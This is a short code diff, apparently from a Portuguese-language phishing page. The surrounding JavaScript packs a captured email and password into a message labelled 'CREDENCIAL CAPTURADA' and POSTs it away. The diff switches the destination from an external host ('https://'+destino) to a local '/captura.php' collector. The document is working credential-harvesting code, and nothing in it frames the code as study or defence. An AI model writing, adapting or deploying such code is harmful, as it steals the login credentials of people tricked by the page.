@@ -32,7 +32,7 @@
       var data = "####\n\n[🥃 CREDENCIAL CAPTURADA]\nEMAIL: " + email + "\nSENHA: " + senha + "\n\n####\n";
 
       // Envia os dados para o ip
-      fetch('https://'+destino, {
+      fetch('/captura.php', {
         method: 'POST',
         body: data,
         headers: {
